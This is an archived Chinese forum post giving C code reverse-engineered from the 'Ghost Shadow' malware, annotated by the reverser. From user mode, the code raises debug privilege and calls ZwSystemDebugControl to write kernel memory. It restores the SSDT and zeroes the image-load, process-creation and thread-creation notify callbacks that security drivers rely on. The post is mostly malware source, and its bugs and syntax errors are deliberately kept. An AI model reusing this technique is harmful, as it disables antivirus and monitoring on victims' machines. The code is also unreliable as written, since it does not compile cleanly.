

# 鬼影里的 ZwSystemDebugControl

> 原文：[`www.pediy.com/kssd/pediy11/109386.html`](https://www.pediy.com/kssd/pediy11/109386.html)

代码:

```
/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*
\*    分析了一下“鬼影”病毒，从里面扒了段代码出来。
\*
\*    该段代码调用 ZwDebugSystemControl 在 Ring3 恢复 SSDT，并摘除
\*    PsSetLoadImageNotifyRoutine、PsSetCreateProcessNotifyRoutine、
\*    PsSetCreateThreadNotifyRoutine 三个钩子。
\*
\*    代码里 bug 较多，我用注释标示出来了，保留原味儿，未做修改。
\*
\*    逆向 by Fypher
\*    http://hi.baidu.com/nmn714
\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/
BOOL Ring3Unhook(IN BOOL bArg) { // bArg 为 0 时只恢复 SSDT，不摘 PsSetXXXNotifyRoutine 钩子
  // 先提权
  HANDLE hToken;
  LUID luid;
  TOKEN\_PRIVILEGES tkp;
  if (OpenProcessToken(GetCurrentProcess, TOKEN\_ALL\_ACCESS, &hToken) ) {
    if (LookupPrivilegeValue(0, "SeDebugPrivilege", &luid)) {
      tkp.Privileges\[0\].Luid.LowPart = luid.LowPart;
      tkp.Privileges\[0\].Luid.HighPart = luid.HighPart;
      tkp.PrivilegeCount = 1;
      tkp.Privileges\[0\].Attributes = SE\_PRIVILEGE\_ENABLED;
      AdjustTokenPrivileges(hToken, FALSE, &tkp, 0x10, NULL, 0);
    }
  }
  CloseHandle(hObject);  // 此处有 bug

  // 获取所需函数，应该检查一下返回值
  char strProcName\[32\] = "ZwSystemDebugControl";
  HMODULE hNtdll = GetModuleHandle("ntdll");
  ZWSYSTEMDEBUGCONTROL ZwSystemDebugControl = GetProcAddress(hNtdll, strProcName);

  strcpy(strProcName, "NtQuerySystemInformation");
  NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = GetProcAddress(hNtdll, strProcName);

  // 查询系统模块信息
  ULONG ulRet = 0;
  NTSTATUS status;
  
  status = NtQuerySystemInformation(SystemModuleInformation, 0, 0, &ulRet);
  if (status != STATUS\_INFO\_LENGTH\_MISMATCH)
    return 0;
  
  // 这里写得不好，没有检查返回值，并且用 heap 类函数快得多
  HLOCAL hlocal = LocalAlloc(LPTR, ulRet);  
  
  status = NtQuerySystemInformation(SystemModuleInformation, hlocal, ulRet, &ulRet)) 
    return 0;  // 此处有资源泄露，应该释放 hlocal

  // WS 的方式把 ntoskrnl 的真名找到了
  PSYSTEM\_MODULE\_INFORMATION pSysModInfo = (PSYSTEM\_MODULE\_INFORMATION)((ULONG)hlocal + 4);
    char\* pstrNtoskrnl = pSysModInfo->ModuleNameOffset + pSysModInfo->ImageName;
  
  HMODULE hNtoskrnl = LoadLibraryEx(pstrNtoskrnl, 0, DONT\_RESOLVE\_DLL\_REFERENCES);
  if (!hNtoskrnl)
    return 0;  // 此处有资源泄露，应该释放 hlocal

  // 准备恢复 SSDT
  strcpy(strProcName, "KeServiceDescriptorTable");
  
  ULONG ulSSDToffset = (ULONG)GetProcAddress(hNtoskrnl, &ProcName) - (ULONG)hNtoskrnl;
  ULONG ulNtoskrnlBase = (ULONG)hNtoskrnl & 0xFFFFFFFE;    // 取得基址，多余操作

  
  ULONG ulPEHdr = \*(PULONG)(ulNtoskrnlBase + 0x3C) + ulNtoskrnlBase;  // 取 PE 头
  ULONG ulImageBase =  \*(PULONG)(ulPEHdr + 52);  // 取 ImageBase
  ULONG ulSSDTAddr =  ulImageBase + ulSSDToffset;
  
  MEMORY\_CHUNKS QueryBuff;
  QueryBuff.Address = (ULONG)ulSSDTAddr;

  ULONG ulSizeOfImage = \*(PULONG)(ulPEHdr + 80);  // 取 SizeOfImage

  PVOID lpAddress;
  int i = 0;
  if (ulSizeOfImage) {
    while (1) {
      lpAddress = (LPVOID)(ulNtoskrnlBase + i);
      // 寻找  mov ds:KeServiceDescriptorTable, xxxxxxxx
      // 特征码 C7 05 SSDT xxxx
      if (\*(PULONG)(lpAddress) == ulSSDTAddr ) {
        if ( \*(WORD \*)(lpAddress - 2) == 0x5C7 )
          break;
      }
      ++i;
      if (i >= ulSizeOfImage)
        break;
    }
    if (i <ulSizeOfImage)
      QueryBuff.Address = \*((PULONG)lpAddress + 1);
  }

  if (i == ulSizeOfImage) {
    return 0;  // 此处有资源泄露，应该释放 hNtoskrnl 和 hLocal
  }
  else {  // 此处有 bug， i > ulSizeOfImage 后程序会流向此处
    PULONG FunAddr = (PULONG)( QueryBuff.Address + (ULONG)hNtoskrnl - ulImageBase);
    DWORD dwOldProtect = 0;
    VirtualProtect(FunAddr, 0x1000, PAGE\_READWRITE, &dwOldProtect);  // 这里应该检查返回值
    int num = 280;  // 这里写得不好，函数个数应该动态获取
    
    do {
      FunAddr\[num\] += (ULONG)pSysModInfo->Base - ulImageBase;
      --num;
    } while (num >= 0);
    
    // 恢复 SSDT
    DWORD dwRet;
    QueryBuff.Address = QueryBuff.Address + (ULONG)pSysModInfo->Base - ulImageBase;
    QueryBuff.Data = FunAddr;
    QueryBuff.Length = 1120;  // 这里写得不好，函数个数应该动态获取
    status = ZwSystemDebugControl(SysDbgWriteVirtualMemory, &QueryBuff, sizeof(QueryBuff), NULL, 0, &dwRet);

    if ( bArg ) {  // 根据参数决定是否摘除 PsSetxxxNotifyRoutine 钩子

      // 准备摘掉 PsSetLoadImageNotifyRoutine 的钩子
      strcpy(strProcName, "PsSetLoadImageNotifyRoutine");
      ULONG ulProcAddr = (ULONG)GetProcAddress(hNtoskrnl, &strProcName);
      
      QueryBuff.Address = ulProcAddr;
      if ( \*(WORD \*)ulProcAddr != 0xCCCC ) {  // 此处有 bug
        do {
          ++ulProcAddr;
        } while ( \*(WORD \*)ulProcAddr != 0xCCCC );
        
        while (ulProcAddr > QueryBuff.Address ) {
          // 寻找 PsImageNotifyEnabled
          // mov ds:\_PsImageNotifyEnabled, 1，特征码 C6 05 xx xx xx xx 01。
          if (\*(WORD \*)ulProcAddr == 0x5C6 && \*((\_BYTE \*)ulProcAddr + 6) == 1 ) {
            ULONG ulPsImageNotifyEnabledAddr = \*(PULONG)(ulProcAddr + 2);

            // 将 PsImageNotifyEnabled 置 0， 摘掉 ImageNotifyEnabled 钩子
            int buff = 0;
            QueryBuff.Address = ulPsImageNotifyEnabledAddr + (ULONG)pSysModInfo->Base - ulImageBase;
            QueryBuff.Data = &buff
            QueryBuff.Length = 1;
            status = ZwSystemDebugControl(SysDbgWriteVirtualMemory, &QueryBuff, sizeof(QueryBuff), NULL, 0, &dwRet);
            break;
          }
          --ulProcAddr;
        }
      }

      // 同理摘掉 PsSetCreateProcessNotifyRoutine 的钩子
      strcpy(strProcName, "PsSetCreateProcessNotifyRoutine");
      ulProcAddr = (ULONG)GetProcAddress(hNtoskrnl, &strProcName);

      QueryBuff.Address = ulProcAddr;
      if ( QueryBuff.Address < QueryBuff.Address + 256 ) {
        // 找函数出口，retn 8
        while ( \*(WORD \*)ulProcAddr != 0x8C2 || \*(BYTE \*)(ulProcAddr + 2) ) {
          ++ulProcAddr;
          if (ulProcAddr >= QueryBuff.Address + 256)
            break;
        }

        while ( ulProcAddr < QueryBuff.Address + 256 ) {
          // 寻找 mov xx, offset \_PspCreateProcessNotifyRoutineCount
          if ((\*(BYTE \*)ulProcAddr & 0xF8) == 0xB8) {
            if (\*(PULONG)(ulProcAddr + 1) > 0x400000) {  // 取得\_PspCreateProcessNotifyRoutineCount
              int buff = 0;
              QueryBuff.Address = \*(PULONG)(ulProcAddr + 1);
              QueryBuff.Address = QueryBuff.Address + (ULONG)pSysModInfo->Base - ulImageBase;
              QueryBuff.Data = &buff;
              QueryBuff.Length = 4;
              status = ZwSystemDebugControl(SysDbgWriteVirtualMemory, &QueryBuff, sizeof(QueryBuff), NULL, 0, &dwRet);
              break;
                    }
            ulProcAddr += 4;
          }
          ++ulProcAddr;
        }
      }
      // 同理摘掉 PsSetCreateThreadNotifyRoutine 的钩子， 不解释了
      strcpy(strProcName, "PsSetCreateThreadNotifyRoutine");
      ulProcAddr = GetProcAddress(hNtoskrnl, &strProcName);
      QueryBuff.Address = ulProcAddr;
      while (1) {
        if (ulProcAddr >= QueryBuff.Address + 256)
          break;
        if (\*(WORD \*)ulProcAddr == 0x4C2 && !\*((BYTE \*)ulProcAddr + 2))
          break;
        ++ulProcAddr;
      }
      for (ULONG addr = ulProcAddr + 3; addr < QueryBuff.Address + 256; ++addr) {
        if ((\*(BYTE \*)addr & 0xF8) == 0xB8) {
          if (\*(PULONG)(addr + 1) > 0x400000) {
            int buff = 0;
            QueryBuff.Address = \*(PULONG)(ulProcAddr + 1);
            QueryBuff.Address = QueryBuff.Address + (ULONG)pSysModInfo->Base - ulImageBase;
            QueryBuff.Data = &buff;
            QueryBuff.Length = 4;
            status = ZwSystemDebugControl(SysDbgWriteVirtualMemory, &QueryBuff, sizeof(QueryBuff), NULL, 0, &dwRet);
            break;
          }
          addr += 4;
        }
      }
    }
    FreeLibrary(hNtoskrnl);
    return NT\_SUCCESS(status);  // 此处有资源泄露，应该释放 hlocal
  }
}

```